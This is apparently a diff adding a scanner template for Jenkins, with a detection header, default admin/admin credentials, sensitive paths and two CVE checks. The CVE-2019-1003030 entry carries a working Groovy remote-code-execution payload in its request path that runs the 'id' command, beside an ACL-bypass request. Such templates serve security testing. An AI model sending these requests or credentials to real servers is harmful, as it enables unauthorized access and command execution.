@@ -1,0 +1,33 @@
+id: jenkins
+name: Jenkins
+
+detection:
+  headers:
+    - "X-Jenkins"
+
+default_credentials:
+  - username: admin
+    password: admin
+
+sensitive_paths:
+  - "/script"
+  - "/asynchPeople/"
+  - "/systemInfo"
+
+cves:
+  CVE-2019-1003030:
+    name: "Groovy Script RCE"
+    severity: critical
+    method: GET
+    path: "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public+class+x+{+public+x()+{+\"id\".execute()+}+}"
+  CVE-2018-1000861:
+    name: "ACL Bypass"
+    severity: high
+    method: GET
+    path: "/securityRealm/user/admin/search/index?q=a"
+
+unauthenticated_checks:
+  - path: "/"
+    description: "Check if dashboard accessible without login"
+  - path: "/script"
+    description: "Check if Groovy console accessible"
